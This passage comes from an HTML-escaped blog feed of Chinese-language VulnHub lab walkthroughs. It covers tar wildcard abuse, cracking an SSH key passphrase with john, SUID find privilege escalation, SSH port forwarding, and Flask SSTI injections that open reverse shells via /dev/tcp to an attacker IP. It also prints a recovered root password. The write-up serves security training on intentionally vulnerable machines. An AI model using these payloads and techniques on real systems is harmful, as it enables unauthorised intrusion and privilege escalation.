class=&#34;line&#34;&gt;tar -cf tar_shell.tar ./*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;--checkpoint[=NUMBER]每第 NUMBER 条记录显示进度消息（默认为 10 ）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;--checkpoint-action=ACTION在每个检查点上执行 ACTION&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1017.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 exp.sh 上传到网站上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1018.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上传成功后，没多长时间我们就接受到了反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1019.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;定时任务查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务查看&#34;&gt;#&lt;/a&gt; 定时任务查看&lt;/h3&gt;
&lt;p&gt;将接受到的 shell 变成一个标准的 shell 终端&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1020.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看计划任务看是什么情况造成这个漏洞的&lt;/p&gt;
&lt;p&gt;crontab -l | tail -n 1&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1021.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可见靶机上有 tar -cvf 的压缩命令的定时任务被定期执行&lt;/p&gt;
&lt;h3 id=&#34;ssh私钥密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh私钥密码破解&#34;&gt;#&lt;/a&gt; ssh 私钥密码破解&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;收集服务器的相关信息，如 id 查看用户组，查看 linux 的版本，查看 pkexec 是否存在，上传 pspy 监控，上传 linpeas 监控服务器上的敏感信息，寻找服务器的权限设置错误，查找 s 权限的文件，看有无端口敲门漏洞，看端口信息是否可做隧道，脏牛提权，敏感的配置文件信息，定时任务等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对上述做了全面信息收集后，并没有找到可利用的点，继续找，找到了 ssh 配对的信息，可以尝试利用此 ssh 私钥连接到其他用户。 &lt;code&gt;cat ~/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1022.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到这个 ssh 私钥文件内容比正常无密码的 ssh 要多一点，怀疑有密钥上有一层密码，需要通过相关工具来破解出密钥的密码。&lt;/p&gt;
&lt;p&gt;查看靶机上总共有哪几个用户  &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1023.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;我们就是要用这个私钥文件分别配对四个用户进行免密登陆&lt;/p&gt;
&lt;p&gt;将私钥文件发送至我们的 kali 攻击机 &lt;code&gt;scp id_rsa parallels@192.168.31.78:/tmp/tmp&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1024.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试用此私钥登陆对方服务器时  &lt;code&gt;ssh -i id_rsa backupper@192.168.31.84&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1025.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提醒我们需要输入密码，破解 ssh 私钥的密码首先想到的就是 john 工具&lt;br&gt;
先用 ssh2john 将私钥文件转化为 john 可识别的文件  &lt;code&gt;ssh2john id_rsa &amp;gt; id_rsa_hash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1026.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再用 john 去破解私钥的 hash 文件 &lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1027.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有爆破出来，这个 john 工具出现了问题，干脆删了它，重新编译一个 john&lt;/p&gt;
&lt;h3 id=&#34;源码编译-john&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#源码编译-john&#34;&gt;#&lt;/a&gt; 源码编译 john&lt;/h3&gt;
&lt;p&gt;并不知道 john 是以何种方式安装的，可以尝试打印其路径，删除其二进制文件，或者先用 apt 源尝试卸载 john  &lt;code&gt;sudo apt remove john&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1028.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看来就是通过 apt 源中下载的 john，将其卸载干净之后，再次输入 john 的命令，判断出来此服务器目前没有了此命令&lt;/p&gt;
&lt;p&gt;下一步就是通过源码编译 john:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4=&#34;&gt;https://github.com/openwall/john&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1029.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;wget https://github.com/openwall/john/archive/refs/tags/1.9.0-Jumbo-1.zip&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1030.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;cd john-1.9.0-Jumbo-1&lt;/code&gt;  在 src 文件夹下配置： &lt;code&gt;./configure&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1031.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同一文件下使用 make 命令编译&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1032.png&#34;&gt;
&lt;p&gt;在 run 文件夹下使用:  &lt;code&gt;./john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1033.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 破解得到 ssh 私钥文件的密码是 samantha1&lt;/p&gt;
&lt;p&gt;将我们编译成功的 john 配置到全局，以软连接的方式强制放到 /usr/bin/john&lt;br&gt;
 &lt;code&gt;sudo ln -sf ~/Desktop/redteam/john/john-1.9.0-Jumbo-1/run/john /usr/bin/john&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;-s 表示添加软连接，-f 表示强制添加，第一个位置是原位置，第二个位置是添加了软连接之后的位置&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1034.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入 john 之后可以看到此命令已经变成全局命令了&lt;/p&gt;
&lt;h3 id=&#34;用户组权限利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户组权限利用&#34;&gt;#&lt;/a&gt; 用户组权限利用&lt;/h3&gt;
&lt;p&gt;凭借私钥及其密码 samantha1 依次尝试前面得到服务器四个有 bash 的用户登陆，最终凭借 jaap 用户登录到了服务器 &lt;code&gt;ssh jaap@192.168.31.84 - i id_isa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1035.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;拿到 jaap 的权限之后，我们同样是没有一些通用的提权方式提权的，需要翻阅文件，看靶机设计者给了我们哪些文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;找到主目录下有两个敏感文件，一个 s 权限的 find 命令，另一个是 startserver.sh 的脚本，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ls -Alh&lt;/code&gt;  看到 find 属于 jaap 用户和 remnie 用户组&lt;br&gt;
 remnie 权限使用 find 提权  &lt;code&gt;sudo -u remnie ./find. -exec /bin/bash -p \; -quit&lt;/code&gt; &lt;br&gt;
 没 sudo，用 jaap 来执行从而拿 remnie 的用户组权限  &lt;code&gt;./find. -exec /bin/sh -p \; -quit&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1036.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有了 remnie 的用户组权限，就可以进入到其用户目录下&lt;/p&gt;
&lt;h3 id=&#34;shell脚本漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shell脚本漏洞&#34;&gt;#&lt;/a&gt; shell 脚本漏洞&lt;/h3&gt;
&lt;p&gt;查看到有段提示说是在本地的某个端口处有一些问题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;查看到 scripts 中的 start.sh 中有一些代码：使用 /tmp/start 创建一个变量文件名，如果文件开始在那里，将使用 ps 命令从进程运行的 grep 形式的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlcnZlci5weQ==&#34;&gt;server.py&lt;/span&gt;，如果 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlcnZlci5weQ==&#34;&gt;server.py&lt;/span&gt; 没有运行，它将运行它，如果是，则它会回显该消息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1037.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看一下当前有哪些端口在运行，记录一下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1038.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上传 pspy 监控，发现的确没有 server.py 被执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1039.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;于是我们接下来就需要去操作得到 /tmp/start 这个文件，记得之前在 jaap 用户中找到过一个 startserver.sh 的文件，去看一看这个文件，这个文件就是用来将 1 输入到 /tmp/start 中的，之后看 pspy 监控&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1040.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Pspy 中监听到了 remnie 用户下的 start.sh 执行了，判断出此时靶机上的某个端口被打开了，看一看目前开放的端口有哪些&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1041.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 此时本地端口 8787 成功被打开了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1042.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;curl-测试内网站点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-测试内网站点&#34;&gt;#&lt;/a&gt; curl 测试内网站点&lt;/h3&gt;
&lt;p&gt;服务器上有 curl 命令，用 curl 测试得到是一个网站，但是服务器不存在 iptables 命令，无法将 8787 端口外放，意外着外界无法访问到此端口，这时候就需要做 ssh 的端口转发&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1043.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ssh-端口转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-端口转发&#34;&gt;#&lt;/a&gt; ssh 端口转发&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ssh 端口转发就是将我们访问某一个 ip:port 的流量转发至另一个 ip:port，如下，在此我的公网 ip 地址中存在一个网站，想要通过 ssh 端口转发，将我本地访问 localhost 的某一个端口的流量转发至这个页面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1044.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;判断本地的 7001 端口并没有被占用  &lt;code&gt;lsof -i:7001 &lt;/code&gt; &lt;br&gt;
将访问本地 7000 端口的信息转发到远程主机的 80 端口上面  &lt;code&gt;ssh -p 2121 -L 7000:localhost:80 root@1.117.52.219 -i /etc/ssh/cloud.pem -N&lt;/code&gt; &lt;br&gt;
-p 表示进入服务器的端口，-L 表示转发规则，前者为本地端口，后者为远程端口，-i 指定私钥文件进行免密，-N 表示不进入服务器&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1045.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;于是，我们访问本地的 7001 端口便可以进入到公网上的页面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1046.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;假如远程主机在 9888 端口部署了一个服务器，但是防火墙并没有开放这个端口，如果本地想要访问这个 9888 ，就可以用上面的案例来绕过防火墙进行 ssh 访问。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以使用 nohup 进行后台运行 &lt;code&gt;nohup ssh -p2121 -L 7001:localhost:80 root@1.117.52.219 -i /etc/ssh/cloud.pem -N &amp;amp;&lt;/code&gt; &lt;br&gt;
 使用一句话命令直接清理本地的 7001 端口 &lt;code&gt;lsof -i: 7001 | awk &#39;&amp;#123;print $2&amp;#125;&#39; | grep -v &#39;PID&#39; | uniq | xargs kill - 9&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1047.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;nohup 无日志产生的后台运行如下  &lt;code&gt;nohup java -jar ruoyi-admin.jar &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1048.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;我们通过端口转发来将我们本地访问 8787 端口时进入到靶机的 8787 界面，从而绕过防火墙规则，靶机上需要确定开放了 8787&lt;/p&gt;
&lt;p&gt;在我们的主机上执行:  &lt;code&gt;ssh -L 8787:127.0.0.1:8787 -i id_rsa jaap@192.168.31. 85 -N&lt;/code&gt; &lt;br&gt;
 于是我门主机打开 8787 的页面就进入到了靶机对应的窗口中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1049.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 接下来转变为对这个端口所在的 web 的测试&lt;/p&gt;
&lt;h3 id=&#34;ssh-内网穿透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-内网穿透&#34;&gt;#&lt;/a&gt; ssh 内网穿透&lt;/h3&gt;
&lt;p&gt;既然提到了 ssh 的端口转发，不得不说一下 ssh 的内网穿透可以将内网的服务穿透到公网上去，&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;实现如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;`user1 mac: lsof -i:1122`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将指定user2 的 1122 端口连接到user1 的 22 端口,-R表示远程端口转发，-N表示不执行，-f后台运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;`user2 kali: ssh -Nf -R *:1122:localhost:22 chentuo@192.168.31.19`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;user3通过连接user1的 1122 端口连接到了user2上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;user3 windows: ssh -p 1122 parallels@192.168.31.19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下图中从上至下分别表示 mac，kali，windows 三个机器&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1050.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;即 user1 相当于一个公网跳板，一个内网的机器连接这个跳板就可以连接到另外一个内网的机器，user3 连接到公网跳板的流量被转发到了另一台内网机器&lt;/p&gt;
&lt;h3 id=&#34;ssti反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti反弹shell&#34;&gt;#&lt;/a&gt; SSTI 反弹 shell&lt;/h3&gt;
&lt;p&gt;打开 127.0.0.1:8787 开始测试网站漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1051.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是 flask 框架，测试 SSTI 模板注入  &lt;code&gt;http://127.0.0.1:8787/?name=&amp;#123;&amp;#123;10*10&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1052.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;回显是计算结果，表示存在此模板注入，利用 SSTI 模板注入在反弹 shell 到 kali 机器上&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:8787/?name=&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&#39;bash -c &#34;bash -i &gt;&amp;/dev/tcp/192.168.31.83/4444 &gt;&amp;1&#34;&#39;)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1053.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹失败可能是采用了过滤机制&lt;/p&gt;
&lt;h3 id=&#34;ssti-失败绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti-失败绕过&#34;&gt;#&lt;/a&gt; SSTI 失败绕过&lt;/h3&gt;
&lt;p&gt;利用 url 编码绕过过滤机制，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5qc29ucy5jbi91cmxlbmNvZGU=&#34;&gt;http://www.jsons.cn/urlencode&lt;/span&gt; 上进行 url 编码转化&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1054.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将上述中用来反弹 shell 的代码进行 url 编码后得到如下网址&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:8787/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#39;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.83%2F4444%20%3E%261%22&#39;)%7D%7D&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;继续访问此网站用来反弹 shell，依然是无效果的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1055.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;换种方式来执行，在对方服务器上写一个 sh 的反弹脚本，利用 SSTI 去读取这个脚本并执行&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /tmp/shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash - c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.83/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1056.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问如下网址用另外的方式来反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:8787/?name=&amp;#123;&amp;#123;request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cd%20/tmp/;bash%20shell.sh%27).read()&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1057.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹虽然成功了，但却立即断开了，原因不明，将机器重新启动后，shell 成功被反弹出来，接收到了一个稳定的 shell, 将所得到的 shell 利用如下三行代码输出为标准的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1058.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 现在我们成功拿到了 remnie 用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;二进制数据解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二进制数据解密&#34;&gt;#&lt;/a&gt; 二进制数据解密&lt;/h3&gt;
&lt;p&gt;remnie 用户下的 server.py 文件就是形成此漏洞的原因&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1059.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;我们现在仍然在一个既没有内核漏洞可以提权，也没有相关权限设置错误提权的机器上，只能寻找于 remnie 相关的文件来找突破口，看到用户主目录下有一个 server.conf 的配置文件，进行查看之后看到了如下信息。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1060.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示说是一个连接 root 服务的文件，最右边的这些二进制数字比较可疑，尝试进行二进制解密&lt;/p&gt;
&lt;p&gt;将这些二进制数字打印出来  &lt;code&gt;cat server.conf | cut -d &#39;|&#39; -f 2 &amp;gt; binary.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1061.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Vim 不进入写模式将换行符换为空  &lt;code&gt;vim 1.txt +&amp;quot;:%s/\n//g&amp;quot; +wq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1062.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;From binary 解密二进制之后得到了十六进制的如下数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1063.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;From magic 解密之后得到了 root 账户的密码  &lt;code&gt;root:-!F8h2LMr&amp;lt;\[n]&#39;N]Kq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1064.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;利用如下命令切换至 root 用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1065.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 账户的权限&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/139%20INFERNO/</id>
        <title>VULNHUB 39 INFERNO</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/139%20INFERNO/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaW5mZXJuby0xMSw2MDMv&#34;&gt;https://www.vulnhub.com/entry/inferno-11,603/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE5OTAyNzM1&#34;&gt;https://blog.csdn.net/weixin_50688050/article/details/119902735&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 INFERNO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1066.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUv&#34;&gt;http://192.168.31.25/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1067.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.25/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1068.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
